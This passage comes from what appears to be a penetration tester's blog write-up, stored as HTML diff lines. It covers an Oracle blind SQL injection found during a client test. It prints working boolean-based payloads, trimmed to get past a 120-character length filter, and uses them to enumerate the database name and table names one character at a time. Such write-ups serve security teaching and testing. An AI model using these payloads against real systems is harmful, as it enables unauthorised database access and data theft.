+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) IS NULL OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;discovering-length-filter&#34;&gt;Discovering Length Filter&lt;/h3&gt;
+&lt;p&gt;After doing a little back and forth with the payloads, I realised that some payloads were not acting as they should be.&lt;/p&gt;
+&lt;p&gt;For example, the following payload resulted in a &lt;code&gt;302 Found&lt;/code&gt; response rather than a &lt;code&gt;200 OK&lt;/code&gt; response:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	CASE 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	WHEN (12345678901234567890=12345678901234567890) THEN NULL 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        	ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    ) FROM DUAL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) IS NULL OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Although they are both the same numbers, the server was resulting in a &lt;code&gt;302 Found&lt;/code&gt; response. Usually, the server responded in a &lt;code&gt;302 Found&lt;/code&gt; response when we sent a character that the server was filtering.&lt;/p&gt;
+&lt;p&gt;However, we did not send any bad characters in this payload. The &lt;code&gt;1=1&lt;/code&gt; payload was found to be working previously.&lt;/p&gt;
+&lt;p&gt;I changed the condition from &lt;code&gt;12345678901234567890=12345678901234567890&lt;/code&gt; to &lt;code&gt;1234567890=1234567890&lt;/code&gt; and the server returned &lt;code&gt;200 OK&lt;/code&gt; with a &lt;code&gt;true&lt;/code&gt; response.&lt;/p&gt;
+&lt;p&gt;This was evident that something weird happened when we sent a large payload. There must be some sort of length filter on the backend that prevents us from sending long payloads.&lt;/p&gt;
+&lt;p&gt;After adding one character at a time, I figured out that if we send any more characters than &lt;strong&gt;120&lt;/strong&gt;, the server would not process the request and we would receive a &lt;code&gt;302 Found&lt;/code&gt; response. Whatever payload we use must be less than or equal to 120 characters.&lt;/p&gt;
+&lt;p&gt;I tried to see ways in which I could shorten the payload. I learned that we can replace &lt;code&gt;NULL&lt;/code&gt; with &lt;code&gt;1&lt;/code&gt; in the payload and it will work just fine. The resulting &lt;em&gt;shorter&lt;/em&gt; payload was:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	SELECT (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;			WHEN (1=1) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;			ELSE 1/0 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	) FROM DUAL
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We moved from requiring 86 characters to 74 characters! Excellent!&lt;/p&gt;
+&lt;p&gt;I suspected that the &lt;code&gt;SELECT&lt;/code&gt; statement around the &lt;code&gt;CASE...WHEN&lt;/code&gt; statement was necessary. I tried removing it and it turns out that it was optional! We can directly use &lt;code&gt;CASE...WHEN&lt;/code&gt; without wrapping it using &lt;code&gt;SELECT&lt;/code&gt;. Our payload was even shorter now.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN (1=2) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This payload was merely 55 characters long!&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-database-name&#34;&gt;Dumping The Database Name&lt;/h3&gt;
+&lt;p&gt;It was now time to enumerate the database names. My strategy to dump the database name was as follows:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find out the length of the current database name. We will refer to the length of the database as &lt;code&gt;len&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Use a substring payload where the &lt;code&gt;SUBSTR()&lt;/code&gt; function starts from the first character of the database and goes till &lt;code&gt;len&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Enumerate one character at a time.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;To determine the database length, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(SYS.DATABASE_NAME) FROM DUAL)&amp;gt;0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above payload checks if the length of the current database name is greater than 0. This is true for any database name. Hence, we get a &lt;code&gt;true&lt;/code&gt; response.&lt;/p&gt;
+&lt;p&gt;By increasing one number at a time, we get to know that the database name is exactly &lt;strong&gt;6&lt;/strong&gt; characters long.&lt;/p&gt;
+&lt;p&gt;To dump the database name, I used a &lt;code&gt;SUBSTR()&lt;/code&gt; payload that looks like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT ASCII(SUBSTR(SYS.DATABASE_NAME,1,1)) FROM DUAL)&amp;gt;0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;payload-explanation-1&#34;&gt;Payload Explanation&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;SUBSTR(SYS.DATABASE_NAME,1,1)&lt;/code&gt;: This part returns the very first character of the database name.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ASCII(...)&lt;/code&gt;: This function converts the first character of the database name to its corresponding ASCII value.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ASCII(SUBSTR(...))&amp;gt;0&lt;/code&gt;: This part checks if the ASCII value of the first character is greater than 0 (which is always true unless the server uses Unicode database names).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;In theory, we can keep increasing from &lt;code&gt;0&lt;/code&gt; to up to &lt;code&gt;127&lt;/code&gt;. However, valid database names start after &lt;code&gt;45&lt;/code&gt; (ASCII value of &lt;code&gt;-&lt;/code&gt;) and go up to &lt;code&gt;122&lt;/code&gt; (ASCII value of lowercase &lt;code&gt;z&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;I did the brute force for each character and found out the database name to be &amp;ldquo;&lt;strong&gt;SYNACK&lt;/strong&gt;&amp;rdquo; (obviously fake because I will not reveal client details).&lt;/p&gt;
+&lt;h3 id=&#34;dumping-the-table-name&#34;&gt;Dumping The Table Name&lt;/h3&gt;
+&lt;p&gt;Now that we know the database name, it was our turn to dump the table names. Using &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md&#34;&gt;PayloadsAllTheThings&lt;/a&gt;, I came across the following query:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;table_name&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; all_tables
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this query would return multiple rows in the response. Using our technique, we can only dump one row and one column, one character at a time. It is very slow but this is the best that we have got.&lt;/p&gt;
+&lt;p&gt;Following the PayloadsAllTheThings page, I knew that we could use the &lt;code&gt;ROWNUM&lt;/code&gt; pseudo-column to filter from the number of rows returned by the query. Incorporating this into our payload, this was our payload that finds the length of the first table from the &lt;code&gt;all_tables&lt;/code&gt; view:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables WHERE ROWNUM=1)=0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Increasing the number, I found out that the table was &lt;strong&gt;4&lt;/strong&gt; characters long.&lt;/p&gt;
+&lt;p&gt;After using a &lt;code&gt;SUBSTR()&lt;/code&gt; payload, I discovered the table name was &amp;ldquo;&lt;strong&gt;DUAL&lt;/strong&gt;&amp;rdquo;. :/ For a practical proof-of-concept, we will need a table that is not a system table. It should contain some client data.&lt;/p&gt;
+&lt;p&gt;I changed from &lt;code&gt;ROWNUM=1&lt;/code&gt; to &lt;code&gt;ROWNUM=2&lt;/code&gt; in the hope that it would give me the next row. However, in Oracle, the &lt;code&gt;ROWNUM&lt;/code&gt; pseudo-column works in an unexpected way. We cannot directly provide a row number apart from &lt;code&gt;ROWNUM=1&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;finding-a-way-to-use-limits-and-offsets&#34;&gt;Finding A Way To Use Limits And Offsets&lt;/h3&gt;
+&lt;p&gt;We had to find a different solution that would limit the number of rows returned by the SQL query. MySQL has &lt;code&gt;LIMIT&lt;/code&gt; and &lt;code&gt;OFFSET&lt;/code&gt; statements that can be used to limit the number of rows. I knew a little about Oracle limits. Upon doing further Google searches, I found out that we need to use &lt;code&gt;OFFSET...FETCH&lt;/code&gt; statements if we wish to limit the results.&lt;/p&gt;
+&lt;p&gt;An example usage would be like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	CASE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		WHEN ((SELECT LENGTH(table_name,1,1) FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)=0) THEN 1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;		ELSE 1/0
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;	END
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)=1 OR &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, this payload would exceed our maximum limit of 120 characters. :(&lt;/p&gt;
+&lt;h3 id=&#34;finding-the-shortest-possible-payload&#34;&gt;Finding The Shortest Possible Payload&lt;/h3&gt;
+&lt;p&gt;I shifted my focus toward crafting the shortest payload that would give me a boolean response. I played around with the payload a bit and I discovered that in some places, spaces were optional. We could eliminate spaces!&lt;/p&gt;
+&lt;p&gt;For example, consider the following &lt;code&gt;CASE...WHEN&lt;/code&gt; payload&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHEN&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;THEN&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ELSE&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 35 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be rewritten to eliminate spaces like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;CASE&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;WHEN&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;THEN&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ELSE&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;END&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 31 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Considering this in mind, I crafted the shortest possible payload that provided me with a boolean response as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN(1=1)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 47 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By doing this, we effectively moved from 86 characters to 47 characters. This was a massive improvement!&lt;/p&gt;
+&lt;h3 id=&#34;successfully-dumping-table-names&#34;&gt;Successfully Dumping Table Names&lt;/h3&gt;
+&lt;p&gt;With our refined payload and using offsets, I went on to dump the table names. I skipped the first table that was &amp;ldquo;DUAL&amp;rdquo; and started dumping the second table name. To do this, I used the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT table_name FROM all_tables OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY)&amp;gt;&amp;#39;&lt;/span&gt;A&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 120 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using this payload, I dumped the first three characters from the table name that was &amp;ldquo;&lt;strong&gt;SYS&lt;/strong&gt;&amp;rdquo;. After dumping the third character, the payload becomes exactly 120 characters long and we cannot dump any further.&lt;/p&gt;
+&lt;p&gt;I found a workaround for this by using the &lt;code&gt;LIKE&lt;/code&gt; statement and eliminating offsets and limits. Here is the payload that I used:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-SQL&#34; data-lang=&#34;SQL&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AND(CASE WHEN((SELECT COUNT(*) FROM all_tables WHERE table_name LIKE &amp;#39;&lt;/span&gt;SYS_______&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;)&amp;gt;0)THEN 1ELSE 1/0END)=1OR&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;-- 114 characters
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Enumerating the table name one character at a time, I found that the table name was &amp;ldquo;&lt;strong&gt;SYSTEMTBL$&lt;/strong&gt;&amp;rdquo;. I could not enumerate the last $ character because it was a bad character. However, I googled the table name and found out that it was also a system table and the table name ended with a $.&lt;/p&gt;
+&lt;p&gt;I tried to play around with the offset values to enumerate more table names but almost all of them turned out to be system tables.&lt;/p&gt;
